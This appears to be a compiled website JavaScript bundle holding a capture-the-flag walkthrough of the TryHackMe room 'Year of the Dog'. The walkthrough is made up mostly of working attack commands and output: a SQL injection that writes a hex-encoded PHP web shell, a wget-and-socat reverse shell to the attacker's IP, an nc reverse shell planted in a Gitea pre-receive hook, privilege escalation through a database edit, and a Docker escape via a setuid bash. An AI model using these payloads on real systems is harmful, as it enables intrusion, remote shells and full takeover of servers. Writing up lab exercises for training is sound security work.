"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3977],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>m});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=r.createContext({}),d=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},p=function(e){var t=d(e.components);return r.createElement(l.Provider,{value:t},e.children)},h="mdxType",c={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},u=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),h=d(n),u=o,m=h["".concat(l,".").concat(u)]||h[u]||c[u]||a;return n?r.createElement(m,s(s({ref:t},p),{},{components:n})):r.createElement(m,s({ref:t},p))}));function m(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=n.length,s=new Array(a);s[0]=u;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[h]="string"==typeof e?e:o,s[1]=i;for(var d=2;d<a;d++)s[d]=n[d];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}u.displayName="MDXCreateElement"},39466:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>c,frontMatter:()=>a,metadata:()=>i,toc:()=>d});var r=n(87462),o=(n(67294),n(3905));const a={},s="Year of the Dog",i={unversionedId:"Tryhackme/Year of the Dog/Year of the Dog",id:"Tryhackme/Year of the Dog/Year of the Dog",title:"Year of the Dog",description:"Always so polite...",source:"@site/writeups/Tryhackme/Year of the Dog/Year of the Dog.md",sourceDirName:"Tryhackme/Year of the Dog",slug:"/Tryhackme/Year of the Dog/",permalink:"/writeups/Tryhackme/Year of the Dog/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"XXE",permalink:"/writeups/Tryhackme/XXE/"},next:{title:"Year of the Fox",permalink:"/writeups/Tryhackme/Year of the Fox/"}},l={},d=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Flags",id:"task-1-flags",level:2}],p={toc:d},h="wrapper";function c(e){let{components:t,...a}=e;return(0,o.kt)(h,(0,r.Z)({},p,a,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"year-of-the-dog"},"Year of the Dog"),(0,o.kt)("p",null,"Always so polite..."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/yearofthedog"},"Year of the Dog")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"SQL Injection"),(0,o.kt)("li",{parentName:"ul"},"Reverse Engineering"),(0,o.kt)("li",{parentName:"ul"},"SQL Manupilation"),(0,o.kt)("li",{parentName:"ul"},"Git Hook Exploitation"),(0,o.kt)("li",{parentName:"ul"},"Docker Escape")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-flags"},"Task 1 Flags"),(0,o.kt)("p",null,"Who knew? The dog has some bite!"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Year of the Dog$ sudo nmap -A -sS -sC -sV -O 10.10.179.85\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 19:13 CET\nNmap scan report for 10.10.179.85\nHost is up (0.032s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)\n|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)\n|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Canis Queue\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=11/14%OT=22%CT=1%CU=40485%PV=Y%DS=2%DC=T%G=Y%TM=5FB01E\nOS:68%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT      ADDRESS\n1   32.22 ms 10.8.0.1\n2   33.13 ms 10.10.179.85\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.49 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.179.85/"})),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(54955).Z,width:"1623",height:"448"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"644bbad7b32f0a63ef4dc1de84e153ca'")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''644bbad7b32f0a63ef4dc1de84e153ca''' at line 1\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"' union select 1, @@version-- -\n")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(66666).Z,width:"1622",height:"371"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"You are number 5.7.31-0ubuntu0.18.04.1 in the queue")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"' union select 1, table_name FROM information_schema.tables-- -\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"You are number queue in the queue")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.179.85/shell.php?cmd=whoami"},"http://10.10.179.85/shell.php?cmd=whoami")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'wget 10.8.106.222/socat -q -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat tcp:10.8.106.222:53 exec:"bash -li",pty,stderr,sigint,setsid,sane\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"wget%2010.8.106.222%2Fsocat%20-q%20-O%20%2Ftmp%2Fsocat%3B%20chmod%20%2Bx%20%2Ftmp%2Fsocat%3B%20%2Ftmp%2Fsocat%20tcp%3A10.8.106.222%3A53%20exec%3A%22bash%20-li%22%2Cpty%2Cstderr%2Csigint%2Csetsid%2Csane\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Year of the Dog$ sudo socat tcp-l:53 file:`tty`,raw,echo=0\n[sudo] password for kali:\nwww-data@year-of-the-dog:/home/dylan$ ls -la\ntotal 120\ndrwxr-xr-x 4 dylan dylan  4096 Sep  5 22:36 .\ndrwxr-xr-x 3 root  root   4096 Sep  3 17:23 ..\nlrwxrwxrwx 1 dylan dylan     9 Sep  3 17:24 .bash_history -> /dev/null\n-rw-r--r-- 1 dylan dylan   220 Sep  3 17:23 .bash_logout\n-rw-r--r-- 1 dylan dylan  3771 Sep  3 17:23 .bashrc\ndrwx------ 2 dylan dylan  4096 Sep  3 17:24 .cache\n-rw-rw-r-- 1 dylan dylan    53 Sep  5 21:40 .gitconfig\ndrwx------ 3 dylan dylan  4096 Sep  3 17:24 .gnupg\nlrwxrwxrwx 1 root  root      9 Sep  3 21:16 .mysql_history -> /dev/null\n-rw-r--r-- 1 dylan dylan   807 Sep  3 17:23 .profile\n-rw-r--r-- 1 dylan dylan     0 Sep  3 17:25 .sudo_as_admin_successful\n-r-------- 1 dylan dylan    38 Sep  5 22:36 user.txt\n-rw-r--r-- 1 dylan dylan 85134 Sep  5 21:11 work_analysis\nwww-data@year-of-the-dog:/home/dylan$ cat user.txt\ncat: user.txt: Permission denied\nwww-data@year-of-the-dog:/home/dylan$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'www-data@year-of-the-dog:/home/dylan$ head work_analysis\nSep  5 20:52:34 staging-server sshd[39184]: Received disconnect from 192.168.1.142 port 45582:11: Bye Bye [preauth]\nSep  5 20:52:34 staging-server sshd[39184]: Disconnected from authenticating user root 192.168.1.142 port 45582 [preauth]\nSep  5 20:52:35 staging-server sshd[39190]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\nSep  5 20:52:35 staging-server sshd[39191]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\nSep  5 20:52:35 staging-server sshd[39194]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\nSep  5 20:52:35 staging-server sshd[39195]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\nSep  5 20:52:35 staging-server sshd[39192]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\nSep  5 20:52:35 staging-server sshd[39189]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\nSep  5 20:52:35 staging-server sshd[39186]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\nSep  5 20:52:35 staging-server sshd[39196]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root\n\nwww-data@year-of-the-dog:/home/dylan$ grep "dylan" work_analysis\nSep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624\nSep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2\nSep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]\nwww-data@year-of-the-dog:/home/dylan$\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"dylan:Labr4d0rs4L1f3")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Year of the Dog$ ssh dylan@10.10.179.85\nThe authenticity of host '10.10.179.85 (10.10.179.85)' can't be established.\nECDSA key fingerprint is SHA256:ZQhtZbHSQm8e0SOq4EyzzwfLf01L5P0MC3bdo9xqb0M.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.179.85' (ECDSA) to the list of known hosts.\ndylan@10.10.179.85's password:\n\n\n        __   __                       __   _   _            ____\n        \\ \\ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \\  ___   __ _\n         \\ V / _ \\/ _` | '__|  / _ \\| |_  | __| '_ \\ / _ \\ | | | |/ _ \\ / _` |\n          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ | |_| | (_) | (_| |\n          |_|\\___|\\__,_|_|     \\___/|_|    \\__|_| |_|\\___| |____/ \\___/ \\__, |\n                                                                        |___/\n\n\ndylan@year-of-the-dog:~$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"dylan@year-of-the-dog:~$ cat user.txt\nTHM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"dylan@year-of-the-dog:~$ ss -tulwn\nNetid   State     Recv-Q    Send-Q            Local Address:Port          Peer Address:Port\nicmp6   UNCONN    0         0                        *%eth0:58                       *:*\nudp     UNCONN    0         0                       0.0.0.0:41742              0.0.0.0:*\nudp     UNCONN    0         0                 127.0.0.53%lo:53                 0.0.0.0:*\nudp     UNCONN    0         0             10.10.179.85%eth0:68                 0.0.0.0:*\ntcp     LISTEN    0         128               127.0.0.53%lo:53                 0.0.0.0:*\ntcp     LISTEN    0         128                     0.0.0.0:22                 0.0.0.0:*\ntcp     LISTEN    0         128                   127.0.0.1:3000               0.0.0.0:*\ntcp     LISTEN    0         128                   127.0.0.1:36097              0.0.0.0:*\ntcp     LISTEN    0         80                    127.0.0.1:3306               0.0.0.0:*\ntcp     LISTEN    0         128                           *:80                       *:*\ntcp     LISTEN    0         128                        [::]:22                    [::]:*\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"www-data@year-of-the-dog:/home/dylan$ /tmp/socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:3000 &\n[1] 1590\nwww-data@year-of-the-dog:/home/dylan$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"dylan@year-of-the-dog:~$ ls -la /\ntotal 239796\ndrwxr-xr-x  23 root root      4096 Sep  5 19:29 .\ndrwxr-xr-x  23 root root      4096 Sep  5 19:29 ..\ndrwxr-xr-x   2 root root      4096 Sep  3 17:31 bin\ndrwxr-xr-x   3 root root      4096 Sep  3 17:34 boot\ndrwxr-xr-x  17 root root      3680 Nov 14 18:10 dev\ndrwxr-xr-x  93 root root      4096 Sep  6 23:31 etc\ndrwxr-xr-x   5 root root      4096 Sep  5 19:29 gitea\ndrwxr-xr-x   3 root root      4096 Sep  3 17:23 home\nlrwxrwxrwx   1 root root        34 Sep  3 17:33 initrd.img -> boot/initrd.img-4.15.0-115-generic\nlrwxrwxrwx   1 root root        33 Sep  3 17:17 initrd.img.old -> boot/initrd.img-4.15.0-20-generic\ndrwxr-xr-x  23 root root      4096 Sep  5 13:21 lib\ndrwxr-xr-x   2 root root      4096 Sep  3 17:30 lib64\ndrwx------   2 root root     16384 Sep  3 17:17 lost+found\ndrwxr-xr-x   3 root root      4096 Sep  3 17:17 media\ndrwxr-xr-x   2 root root      4096 Apr 26  2018 mnt\ndrwxr-xr-x   3 root root      4096 Sep  5 13:21 opt\ndr-xr-xr-x 121 root root         0 Nov 14 18:10 proc\ndrwx------   4 root root      4096 Sep  6 14:07 root\ndrwxr-xr-x  28 root root       900 Nov 14 18:10 run\ndrwxr-xr-x   2 root root     12288 Sep  5 13:21 sbin\ndrwxr-xr-x   2 root root      4096 Apr 26  2018 srv\n-rw-------   1 root root 245452800 Sep  3 17:17 swapfile\ndr-xr-xr-x  13 root root         0 Nov 14 18:10 sys\ndrwxrwxrwt  10 root root      4096 Nov 14 18:48 tmp\ndrwxr-xr-x  10 root root      4096 Sep  3 17:17 usr\ndrwxr-xr-x  13 root root      4096 Sep  3 17:34 var\nlrwxrwxrwx   1 root root        31 Sep  3 17:33 vmlinuz -> boot/vmlinuz-4.15.0-115-generic\nlrwxrwxrwx   1 root root        30 Sep  3 17:17 vmlinuz.old -> boot/vmlinuz-4.15.0-20-generic\ndylan@year-of-the-dog:~$ cd /gitea/\ndylan@year-of-the-dog:/gitea$\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.179.85:8080/"},"http://10.10.179.85:8080/")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Year of the Dog$ scp dylan@10.10.179.85:/gitea/gitea/gitea.db /home/kali/CTFs/tryhackme/Year\\ of\\ the\\ Dog/gitea.db\ndylan@10.10.179.85\'s password:\ngitea.db                                                                         100% 1184KB 393.6KB/s   00:03\nkali@kali:~/CTFs/tryhackme/Year of the Dog$ sqlite3 gitea.db\nSQLite version 3.31.1 2020-01-27 19:55:54\nEnter ".help" for usage hints.\nsqlite> SELECT * FROM user;\n1|dylan|Dylan|Dylan Anderson|dylan@yearofthedog.thm|0|enabled|f2fd45caa2f5eae17cb5faa06eb57c4ad05532550fe37ae99e2245429757af09350be12abba616de4e8f0e37d223bd327261|argon2|0|0|0||0|||Rs6zSrVgx0|vkA9FTpZ72|en-US||1599331364|1599511857|1599511857|0|-1|1|1|0|0|0|1|0|8bb88c80301457422026e95699061e4a|dylan@yearofthedog.thm|1|0|0|0|1|0|0|0|0||gitea|0\n2|test|test||test@example.de|0|enabled|e6d955e14c8e7d1736ea12090cc7fd8bfb9ed04ed907d06626969038c60dc8a341925af3bcfa870805bc07010e8a18f47a3f|argon2|0|0|0||0|||evuSMwlzZI|5lIckyKZjs|en-US||1605380293|1605380293|1605380293|0|-1|1|0|0|0|0|1|0|27091d6d9177f6041782b04c2223746f|test@example.de|0|0|0|0|0|0|0|0|0||gitea|0\nsqlite> select lower_name, is_admin from user;\ndylan|1\ntest|0\nsqlite> UPDATE user SET is_admin=1 WHERE lower_name="test";\nsqlite> .quit\nkali@kali:~/CTFs/tryhackme/Year of the Dog$\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.179.85:8080/admin"},"http://10.10.179.85:8080/admin")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.179.85:8080/test/Test-Repo/settings/hooks/git/pre-receive"},"http://10.10.179.85:8080/test/Test-Repo/settings/hooks/git/pre-receive")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-sh"},'#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with \'echoback=\'\n# and rejects all pushes when the "reject" push option is used.\n#\n# To enable this hook, rename this file to "pre-receive".\n\nif test -n "$GIT_PUSH_OPTION_COUNT"\nthen\n    i=0\n    while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"\n    do\n        eval "value=\\$GIT_PUSH_OPTION_$i"\n        case "$value" in\n        echoback=*)\n            echo "echo from the pre-receive-hook: ${value#*=}" >&2\n            ;;\n        reject)\n            exit 1\n        esac\n        i=$((i + 1))\n    done\nfi\nmkfifo /tmp/f; nc 10.8.106.222 9001 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"dylan@year-of-the-dog:~$ git clone http://localhost:3000/test/Test-Repo && cd Test-Repo\nCloning into 'Test-Repo'...\nwarning: You appear to have cloned an empty repository.\ndylan@year-of-the-dog:~/Test-Repo$ echo \"test\" >> README.md\ndylan@year-of-the-dog:~/Test-Repo$ git add README.md\ndylan@year-of-the-dog:~/Test-Repo$ git commit -m \"Exploit\"\n[master (root-commit) 95a2fec] Exploit\n 1 file changed, 1 insertion(+)\n create mode 100644 README.md\ndylan@year-of-the-dog:~/Test-Repo$ git push\nUsername for 'http://localhost:3000': test\nPassword for 'http://test@localhost:3000':\nCounting objects: 3, done.\nWriting objects: 100% (3/3), 217 bytes | 217.00 KiB/s, done.\nTotal 3 (delta 0), reused 0 (delta 0)\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'dylan@year-of-the-dog:/gitea/gitea$ cd /bin\ndylan@year-of-the-dog:/bin$ python3 -m http.server\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n172.17.0.2 - - [14/Nov/2020 19:14:14] "GET /bash HTTP/1.1" 200 -\n^C\nKeyboard interrupt received, exiting.\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Year of the Dog$ nc -nlvp 9001\nListening on 0.0.0.0 9001\nConnection received on 10.10.179.85 36967\nwhoami\ngit\nid\nuid=1000(git) gid=1000(git) groups=1000(git),1000(git)\nsudo -l\nUser git may run the following commands on 42040a8f97fc:\n    (ALL) NOPASSWD: ALL\nsudo -s\nid\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\nwget 172.17.0.1:8000/bash -O /data/bash\nConnecting to 172.17.0.1:8000 (172.17.0.1:8000)\nsaving to '/data/bash'\nbash                 100% |********************************| 1087k  0:00:00 ETA\n'/data/bash' saved\nchmod 4755 /data/bash\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"dylan@year-of-the-dog:/gitea$ ls -la\ntotal 1108\ndrwxr-xr-x  5 root  root     4096 Nov 14 19:14 .\ndrwxr-xr-x 23 root  root     4096 Sep  5 19:29 ..\n-rwsr-xr-x  1 root  root  1113504 Nov 14 19:14 bash\ndrwxr-xr-x  5 dylan dylan    4096 Sep  5 19:41 git\ndrwxr-xr-x  9 dylan dylan    4096 Nov 14 19:05 gitea\ndrwx------  2 root  root     4096 Sep  5 19:29 ssh\ndylan@year-of-the-dog:/gitea$ ./bash -p\nbash-4.4# id\nuid=1000(dylan) gid=1000(dylan) euid=0(root) groups=1000(dylan)\nbash-4.4# cat /root/root.txt\nTHM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}\n")),(0,o.kt)("p",null,"User Flag"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}")),(0,o.kt)("p",null,"Root Flag"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}")))}c.isMDXComponent=!0},54955:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-11-14_19-22-7639c63bf8fc3a4eb18adf3efebd2d52.png"},66666:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-11-14_19-24-b40d830665a588c23b38c9a44a494259.png"}}]);